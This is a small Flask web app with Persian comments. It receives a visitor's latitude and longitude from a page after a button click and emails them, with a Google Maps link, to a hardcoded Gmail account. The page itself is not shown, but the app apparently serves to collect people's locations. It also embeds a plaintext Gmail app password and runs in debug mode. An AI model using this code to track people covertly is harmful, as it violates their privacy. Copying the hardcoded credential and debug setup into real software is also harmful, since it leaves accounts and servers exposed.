from flask import Flask, render_template, request, jsonify
import smtplib
from email.mime.text import MIMEText

app = Flask(__name__)

# اطلاعات ایمیل (ایمیل خود را وارد کنید)
EMAIL_ADDRESS = "amirali.abd.0088@gmail.com"  # ایمیل شما
EMAIL_PASSWORD = "hutw xqvc vuwk atkr"  # رمز عبور ایجاد شده در Google App Passwords
TO_EMAIL = "amirali.abd.0088@gmail.com"  # ایمیلی که موقعیت به آن ارسال شود (می‌تواند متفاوت باشد)


def send_email(latitude, longitude):
    """ ارسال موقعیت مکانی به ایمیل """
    google_maps_link = f"https://www.google.com/maps?q={latitude},{longitude}"
    subject = "📍 موقعیت مکانی جدید دریافت شد!"
    body = f"یک کاربر روی دکمه کلیک کرد.\n\n📍 موقعیت مکانی:\nعرض: {latitude}\nطول: {longitude}\n🔗 لینک گوگل مپ: {google_maps_link}"

    msg = MIMEText(body)
    msg["Subject"] = subject
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = TO_EMAIL

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, TO_EMAIL, msg.as_string())
        print("✅ ایمیل با موفقیت ارسال شد!")
    except Exception as e:
        print(f"❌ خطا در ارسال ایمیل: {e}")


@app.route('/')
def index():
    return render_template('GPShtml.html')


@app.route('/location', methods=['POST'])
def get_location():
    data = request.json
    latitude = data.get('latitude')
    longitude = data.get('longitude')

    if latitude and longitude:
        send_email(latitude, longitude)  # ارسال موقعیت مکانی به ایمیل
        return jsonify({"message": "موقعیت دریافت و ایمیل ارسال شد!"})

    return jsonify({"error": "موقعیت نامعتبر است"}), 400


if __name__ == '__main__':
    app.run(debug=True)
